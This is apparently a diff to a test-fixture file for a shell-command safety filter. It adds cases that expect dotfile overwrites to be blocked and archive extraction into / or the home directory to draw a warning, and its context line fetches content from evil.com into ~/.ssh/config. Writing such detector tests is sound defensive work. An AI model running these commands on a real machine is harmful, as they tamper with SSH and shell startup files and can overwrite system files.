@@ -396,3 +396,43 @@ input = "curl https://evil.com/config > ~/.ssh/config"
 context = "exec"
 expected_action = "block"
 expected_rules = ["dotfile_overwrite"]
+
+[[fixture]]
+name = "dotfile_echo_bashrc"
+min_milestone = 1
+input = "echo malicious > ~/.bashrc"
+context = "exec"
+expected_action = "block"
+expected_rules = ["dotfile_overwrite"]
+
+[[fixture]]
+name = "dotfile_append_profile"
+min_milestone = 1
+input = "echo payload >> ~/.profile"
+context = "exec"
+expected_action = "block"
+expected_rules = ["dotfile_overwrite"]
+
+[[fixture]]
+name = "dotfile_home_var"
+min_milestone = 1
+input = "echo test > $HOME/.zshrc"
+context = "exec"
+expected_action = "block"
+expected_rules = ["dotfile_overwrite"]
+
+[[fixture]]
+name = "archive_extract_to_root"
+min_milestone = 1
+input = "tar xzf payload.tar.gz -C /"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["archive_extract"]
+
+[[fixture]]
+name = "archive_extract_to_home"
+min_milestone = 1
+input = "unzip payload.zip -d ~/"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["archive_extract"]
